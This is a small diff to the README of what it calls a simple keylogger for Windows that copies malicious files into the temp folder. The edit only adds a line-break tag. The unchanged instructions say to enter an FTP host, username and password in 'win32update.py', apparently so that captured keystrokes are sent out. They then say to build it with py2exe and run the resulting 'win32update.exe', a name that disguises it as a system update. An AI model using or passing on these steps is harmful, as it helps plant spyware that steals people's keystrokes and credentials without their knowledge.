@@ -5,5 +5,5 @@ A simple keylogger copying malicious files in windows's temp folder and on every
 # Instructions
 
 1) Modify ftp login (host, username, password) in win32update.py<br>
-2) Run in cmd "sudo python setup_w.py py2exe"
+2) Run in cmd "sudo python setup_w.py py2exe"<br>
 3) Run win32update.exe
